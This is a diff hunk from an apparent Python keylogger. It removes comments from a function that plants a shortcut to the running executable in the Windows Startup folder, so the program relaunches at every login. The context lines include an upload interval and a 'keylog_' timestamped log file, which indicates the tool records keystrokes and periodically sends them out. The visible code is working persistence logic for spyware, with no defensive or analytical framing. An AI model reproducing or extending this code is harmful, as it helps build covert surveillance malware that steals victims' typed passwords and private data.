@@ -21,40 +21,31 @@ UPLOAD_INTERVAL = 10
 
 
 def create_startup_shortcut(exe_path):
-    # Get the current user's Startup folder path
+    
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
     
-    # Define the shortcut path in the Startup folder
     shortcut_name = os.path.basename(exe_path) + ".lnk"
     shortcut_path = os.path.join(startup_folder, shortcut_name)
     
-    # Check if the shortcut already exists
     if os.path.exists(shortcut_path):
         print(f"Shortcut already exists at: {shortcut_path}")
         return
 
-    # Create a Shell object using COM
     shell = win32com.client.Dispatch('WScript.Shell')
     
-    # Create the shortcut
     shortcut = shell.CreateShortcut(shortcut_path)
     
-    # Set the target of the shortcut (where it points to)
     shortcut.TargetPath = exe_path
     
-    # Optionally, set the icon (you can use the exe's icon or any custom one)
     shortcut.IconLocation = exe_path
     
-    # Save the shortcut
     shortcut.save()
     
     print(f"Shortcut created: {shortcut_path}")
 
 if __name__ == "__main__":
-    # Get the path to the current running executable
     current_exe_path = sys.executable
     
-    # Create the shortcut in the Startup folder
     create_startup_shortcut(current_exe_path)
 
 log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
